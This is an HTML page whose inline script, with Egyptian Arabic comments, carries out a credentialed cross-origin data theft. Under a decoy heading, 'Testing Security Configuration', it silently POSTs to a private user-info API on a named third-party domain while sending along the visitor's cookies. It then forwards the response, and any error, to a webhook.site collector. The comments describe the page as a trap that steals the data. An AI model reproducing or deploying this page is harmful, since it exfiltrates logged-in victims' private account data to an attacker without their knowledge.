<!DOCTYPE html>
<html>
<body>
    <h1 style="color: red;">Testing Security Configuration...</h1>
    <script>
        // ده رابط المصيدة بتاعك
        const webhookUrl = "https://webhook.site/d0a0ebf1-0886-4e03-bd0b-74fbba679e8f";
        const targetUrl = "https://http-gateway2.janapw.com/api/v1/private/trace/user/getTraceUserInfo";

        fetch(targetUrl, {
            method: "POST",
            credentials: "include", // عشان يبعت الكوكيز ويسرق البيانات
            headers: {
                "Content-Type": "application/json;charset=utf-8",
                "Terminaltype": "1"
            },
            body: JSON.stringify({"languageType": 0})
        })
        .then(res => res.json())
        .then(data => {
            // بيبعت البيانات فوراً لموقع Webhook بتاعك
            fetch(webhookUrl, {
                method: "POST",
                mode: "no-cors", 
                body: JSON.stringify(data)
            });
            document.body.innerHTML = "<h1>Success! Data exfiltrated.</h1>";
        })
        .catch(err => {
            console.error(err);
            // حتى لو فشل بيبعت رسالة بالخطأ عشان نعرف السبب
            fetch(webhookUrl + "?error=" + btoa(err));
        });
    </script>
</body>
</html>
